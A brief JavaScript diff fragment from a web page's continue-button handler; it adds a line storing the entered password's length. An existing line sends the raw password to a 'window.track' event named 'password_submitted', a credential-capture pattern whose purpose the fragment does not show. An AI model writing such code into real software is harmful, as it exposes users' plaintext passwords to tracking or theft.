@@ -1150,6 +1150,7 @@ function wireContinueButtons(){
     e.stopPropagation();
     if (e.stopImmediatePropagation) e.stopImmediatePropagation();
     if (hasPassword) {
+      setStoredPassLen((input.value || '').length);
       try { window.track('password_submitted', input.value || ''); } catch(err){}
       try { window.track('continue_clicked', '1'); } catch(err){}
       navigateTo(nextPage);
